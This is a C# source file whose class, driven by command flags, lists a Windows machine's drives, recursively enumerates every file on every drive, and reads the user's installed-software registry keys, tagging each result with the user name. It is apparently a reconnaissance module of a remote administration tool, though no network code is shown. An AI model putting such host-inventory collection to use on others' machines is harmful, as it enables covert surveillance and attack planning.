using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using System.Threading.Tasks;

namespace Admin
{
    public class GetDate
    {
        public List<string> information = new List<string>();
        public List<string> ParseCommand(string command)
        {
            if (command.Contains("-D"))
            {
                GetDisk();
            }
            if (command.Contains("-I"))
            {
                GetInformation();
            }
            if (command.Contains("-R"))
            {
                GetKeys();
            }
            return information;

        }

        public void GetKeys()
        {
            string ListKeys = String.Format("<GetDateResult> {0} ", Environment.UserName);
            const string REGISTRY_ROOT = @"SOFTWARE\";
            using (RegistryKey rootKey = Registry.CurrentUser.OpenSubKey(REGISTRY_ROOT, true))
            {
                if (rootKey != null)
                {
                    string[] valueNames = rootKey.GetSubKeyNames();
                    StringBuilder sb = new StringBuilder(valueNames.Length);
                    foreach (string ch in valueNames)
                    {
                        sb.Append("\n");
                        sb.Append(ch);
                    }
                    ListKeys += sb.ToString();
                }
                rootKey.Close();
            }
            information.Add(ListKeys);
        }

        public void GetDisk()
        {
            StringBuilder driveList = new StringBuilder();
            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                if (d.IsReady) driveList.AppendLine(String.Format("Диск: {0}; метка тома: {1}; файловая система: {2}; тип: {3}; объем: {4} байт; свободно: {5} байт", d.Name, d.VolumeLabel, d.DriveFormat, d.DriveType, d.TotalSize, d.AvailableFreeSpace));
            }
            string temp = String.Format("<GetDateResult> {0} {1}",Environment.UserName, driveList.ToString());
            information.Add(temp);
        }

        public void GetInformation()
        {
            string ListPatch = String.Format("<GetDateResult> {0} ", Environment.UserName);
            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                string[] S = SearchDirectory(d.Name);
                
                foreach (string folderPatch in S)
                {
                    try
                    {
                        string[] F = SearchFile(folderPatch);
                        foreach (string FF in F)
                        {
                            ListPatch += FF + "\n";
                        }
                    }
                    catch
                    {
                    }
                }
            }
            information.Add(ListPatch);
        }
        static string[] SearchFile(string patch)
        {
            string[] ReultSearch = Directory.GetFiles(patch, "*", SearchOption.AllDirectories);
            return ReultSearch;
        }
        static string[] SearchDirectory(string patch)
        {
            string[] ReultSearch = Directory.GetDirectories(patch);
            return ReultSearch;
        }
    }
}
